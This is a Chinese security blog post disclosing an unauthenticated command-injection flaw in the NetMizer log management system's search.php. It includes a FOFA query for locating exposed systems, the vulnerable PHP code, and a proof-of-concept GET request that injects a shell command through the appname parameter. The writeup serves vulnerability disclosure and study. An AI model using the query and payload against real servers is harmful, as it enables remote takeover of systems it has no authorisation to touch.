---
title: "NetMizer日志管理系统 search.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-search-appname-rce.html
asset_dir: assets/netmizer日志管理系统-search.php-命令执行漏洞
---

# NetMizer日志管理系统 search.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/19 08:33
- 819浏览
- [0评论](#comment)
- 24分钟阅读

深入探索

Web服务器

应用程序

应用

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/search.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞扫描服务

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `search.php` 业务实现关键逻辑部分

```
else if($action == 'addtask'){
    $search_root = "/var/www/$path";
    ......
if($path == 'search') $appname = 'search';
else if($path == 'url') $appname = 'search_url';
else if($path == 'https') $appname = 'search_https';
else if($path == 'host_search') $appname = 'search_host';
else if($path == 'dst_search') $appname = 'dst_search';
$cmd_root = "/var/www/cgi-bin/$appname";
......
if(is_dir($search_root) == false) mkdir($search_root);
if(!isset($now)) $now = time();
$filename = $search_root."/".$now.".cfg";
$fp = fopen($filename, "w");
if($fp) {
    fputs($fp, $str);
    fclose($fp);
    chdir("/var/www/cgi-bin/");
    $cmd = $cmd_root." -t -i $now > /dev/null &";
    //$cmd = $cmd_root." -t -v -i $now > /tmp/aa1.txt &";
    @exec($cmd);
}
echo '{"success":true}';
return;
```

深入探索

漏洞修复方案

物流软件安全

数据库

当 `$action = 'addtask'` 时，用户可控参数 `$appname` （变量覆盖）直接用于构建命令行字符串 `$cmd`，并通过 `exec($cmd)` 执行。该参数未经过充分过滤或转义，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

同样当 `$action = 'showtask'` 时，也存在同样的命令注入漏洞

软件

```
else if($action == 'showtask'){
    if($csv) $arr_proto = getcontentdesc(0);
    else $arr_proto = getcontentdesc();

    $curid = $page;
    $linenum = $limit;

    if($path == 'search') $appname = 'search';
    else if($path == 'url') $appname = 'search_url';
    else if($path == 'https') $appname = 'search_https';
    else if($path == 'host_search') $appname = 'search_host';
    else if($path == 'dst_search') $appname = 'dst_search';
    $cmd_root = "/var/www/cgi-bin/$appname";
    $cmd = $cmd_root." -i ".intval($id)." -p ";

    chdir("/var/www/html/");
    if(!$csv){
       $total = gettotal(intval($id), $path);
       if($total == 0){
          $fp=@popen($cmd, "r");
          $line=fgets($fp,256);
          if(substr($line, 0, 5)=="Error") {
             @pclose($fp);
             return $line;
          }
          while($line=fgets($fp,2048)){
             $total++;
          }
          @pclose($fp);
       }
       $startline = ($curid-1)*$linenum;
       $endline = $curid*$linenum;
       $cmd .= " -s $startline -e $endline";
    }
    $fp=@popen($cmd, "r");
```

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/search/search.php?action=addtask&appname=search;sleep+3+%23 HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 search.php 命令执行漏洞](images/img-001-e97703d6477d.webp)](https://image.mrxn.net/6f01ae2fc3b642b18e635b28bc57e2c3.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALjklEQVR4AeycjVbjyA6E+eb933lvyjXVVv/YSRgguQdzECWVSnLT6g6B2bN/Pj4+/vus/Td81D5DqoVVE78lT5xog5EmFq64M1650dKjYjSVkx9eqFgm/19MA7nVX5/vsgNtILfpfjxqR4uv9cAHMEmrJj6wacGYInAMTGsD59JDCOZS/1Wo3rL0Az9HXCy5YPhHMDXCNhAFl71+B6aBgKcPM95bLuw10cLOAaEfwnq6HimIPtrEwHYDw69w1AIr2dMcsD0bZlw1mwayEl3cz+3Atw0kJy64+pbApyaaIJivNWAOjDV35IO16bvC1IK1iYUwc+Jj4DwQ6p/x2wbyzyv7pQ2+ZCDA9jpZT+C4n8mNvGJwPRjFycAx7O+yxFeDXQP2k88zoeeTF0ZzhuB6MKruu+xLBvJdi/uNfb9nIL9xJ7/oe54GcnZ1j56ZmpoHX284xqqv/qpfzcuPZoXKy8DPjgYcwzGqLgbWJU6fFUYz4kobbtQqngYi8rLX7UAbCPg0wH0clwuuGXnF42lILFReJl8m/1kDPxuYStVTBhy+6VBeNhUXQnkZuE9S4BgI1RDYngn3sRXdnDaQm399vsEO/NHkP2tn609P8Ak500KvgT4+q81zhEc65WTgvkCTAttJbkRxVCODXgN9XEqmP4Kq/hm7bkjdzTfwp4GApw/G1RrBOTBGA46BUO3ENKI4OTmF6tzkhV3iFgDbyYYZb+mHP9W72llh1cmvWujXkRzsfLgznAZyJr5y378DbSDgSWrysrNHK7+yWgPuB8bowTFQ5Q/76bMqOMtJn3xF8TJgu3HyYzBzysGaVy695Y8GrgNj8uAY+GgD+Xj/j1+xwmsgbzbmP+DrcrQucB5mTA04l1h4dnWVr3akBfeFGVNTEawLB47BWJ8J5sCYHDiG/S/MY7/EK0yf4EoTDvysaIXXDdEuvJG1XwyfWVMmnJoxDi88yykvg/mkiK+WPkGYa5KrdfLDg2sA0ZslF9zIv1+A7Qc9GP/SHQfOgTGaR3D1zOuGPLJzP6hpA8m04P6k4b7m6HvIc4Rw3keaWPrBcQ2sc7Dm1ROcA6O4WJ4dPOKTF0bzDKou1gbyTINL+3078NRAMsVglgU+XeGFYG7UgHkgqQlVLwOm12vxsqloQUh3ZJGP+fAVweuItubigzVgPOLBeSCSDp8aSFd5Bd+yA9dAvmVbP990Gsgz1xLYXlJSA46BwxVFW3EUA11faaOBPhdeKJ1MvgysBaO4I4P7mtSCtbCjniuLZoXKV1tppoGsRBf3cztwOJA6yfhZ1hiPfPLC5M5QOlk08mWJhYpl8qvBfkrDgznpZSMPhJpQ+hjQ3dSIk08sBGvlHxlYAz1W/eFAqujyf24H2h8XwVPLo8Ex7Djmxhh2LfR+tCsEa8ccmAfG1HZyoeeBjR9P8BhPzW5ENOAewI31J7D1dXT+deyTuOJZh+uGnO3OC3Ltj4uZIPg0JK5rChesuXt+asD9YcfkguDcvZ738uA+YEx/4b3aVR7cB4zqM9pYB9bCjmea64aMu/PiuA0EPMFMPOtKLAwH1iZWTpZYqFgmXwZ9jTjlZfJlYI04mbgY9DnlR4t2xOgqHw7cF4xV8xkf3Cf9zzD9q6YNJMkLv2QHPt3kGsint+57Ctvb3lybRx4TbRDmawrmxn6pEcJakxppRoO+BhwDKZsQ2N62wo4RpX/iismNWDX3fJifmZr0TSy8boh24Y3s7kBgnzCs/dX3M05/jFUTDtxXnAwcw47iq4FzlYsPx7lojjBrEkYD7gdG5WTgGHYcaxJXBOvDgWPg+g/lPt7so/1imHXBPi0g9IY6FSvbkrcvQHutvoXdJ+w5sB/B2HPFw3lN7ZH6YM3FB/cDY/jUCKHPRQPmpYklN2LyFaOpXPy7L1kRXvgzO9AGAv3Uz6YIvTZLTY1wxYmvFg24HxijSf4MwTXAJDvrc5YbGwHt5gNjuouBTduRBwHM2jaQg5qL/uEduAbywxt+73HtF8MI61UON+KRBnwFYcfUws6B/eTGftDno1thaoWrfOXAfWFH1clg58C+eFntIV+cTP5o4mUjrxjcV75MutGuG6KdeSM7HAj009SawRz0qJysTluxDKxNTlwMnEscTRCcByJpCGw/PGHGiKDPpa9w1IgbLZpg8okrQv8scFw1ow/WwI6HAxmLr/hndqD9Ypjpg6eVuGKWVLnqJ18x+XCJheHAz4QekxdKX02crHLxxcvGGPb+ylcD5+5xNZ/+z2J6rOquG5LdeRNsA4H5hGiNYB5QuBmwvX5vwe0L9PGNmj5h1uSEjOIjftQdxamH+ZmpiSbxGY5amPvCzKknmIcdxR9ZG8iR4OJ/dgemgYynIbEwS5MvG2OYTwGYk14GjoGUt//bg/KylnjAAbbbCjQ1sHEh1HO05J5B6PvW2vSHXhNeGD1YA8bwwmkgIi973Q68YCCv+2b/H548/ekE5ms0fiNgDfSoaxlLzVEsPhro+4SXJhYuGL7imEsMfX8gqenlEthe7oCmATauEQ844BrY8YGy618MH9mkn9R86iWrnkr5WTDcPw0wa9RDlj5nCK4/04w59ZaNvGI47qcamXQrA9cCq/RdTr1lwHYDgeuGfLzZR7shmlS1rBP26a04mP+fILUPuD61qxz0mmjBPBCqveYD7VSB/YjAcZ4V/gyhr1HtmX7MQV+fvPrEwgWhr5GuDSSiC1+7A20g4GmNy9HUYsklDoJrYcdoR4Rdk/pgtGBNeCGYiyaoXCzciDDXgrnUBsdaxWMu8QqlP7JRHx14LcD1M+TjzT7aDXmzdf3a5bSB5DqBr092BBzD/sMbzEWT2sQVx1xiIbgPGFOnnAzMw/7saEZ8NlZ/GfgZj9RLL/usFvwsMKqXrPZrA6nk5b9uB9pAYD01TTCWZY5x+IrgfmBMDhwDoSYEtre0U+JGgHOrNYBzN1n3udJGcJYD9wNjaoJgHnZM7rPYBvLZBlfd1+7A9G/qY3uYpw87B4wlW3x08sILN+Hti/xqN2r7POM2wfAl+tDAdtPAmLwQzEGPqa0ovQysrbn4ysug14BjINLpl9uWuDnXDbltwjt9toEA3WkCx6vF6iRUg1kLM6deYB5Q2BmwraEj/wbgHBj/0kvI2sYkuBb2d22jFnbNWJ8YrEkshJkT/4hlDcI2kEcKL83370D7BypNp9rZo8GnAYy1bvTTB6xNLIwWnEusnAzMw36ixctgz8Hal06WvhWhr0lO+tjIJQ5Gt0Jw/1XujLtuyNnuvCB3DeR0038+2d72jo/OtawYTeXkg68n7BjtiNLHxlzi5CuCe59poh814FrYMdogOJfainCciy59RkxemJx82RiLu26IduGNrP1QB58CeBzPvg9wn1ED5oExdRqvTpMKgO2tMqDw1NJDCGx1Y4FyMVhrxpoaw3EN9DnoY/W5boh24Y2sDSSn4hEc139WE200iSsmBz4xYKyaIz+1wlED9/uANaqXgWNgbNdiYHm7JFAPmfwjA9dLJwPHwPUvhh9v9tFuSNYF+7Sg96N5BnUCZOBetRZ6TjpZ1Rz54FqYMTXqVS28sPLyxR2Z8rLk5csSC2FeB6BUM9XIQgDbTRMXmwYS8YWv2YFrIK/Z98OnfslAwFcPZjx88iIBrs/1rRJwLlw0ZxjtGcL9vmAN9Ljqm/Ukl1gYLihOBnvfLxlIHnDhv+/Alw5E0x4NPP0sdcwrBmvky6JdofIycE3VQM+BYzjGWi8fZq2eJ1P+noHrpZet9OJlycmPfelA8oALP78D00AyqRUePSZa8OkAjqQP8cD2dhB2TCGYO3sm9JpozxCOa8C5rGGF6Z0c3K8ZtcD1i+HHm320GwKeKNzHo+8hp0QI7iO/Wq0FayonP3r5oyUH61rpo5F/z+C4z1HtI/2jAfcHWjtgewUIEa2wDSTJC1+7A9dAXrv/09P/BwAA//+mVvY6AAAABklEQVQDAIA6KpWdyRbwAAAAAElFTkSuQmCC)

手机扫码阅读
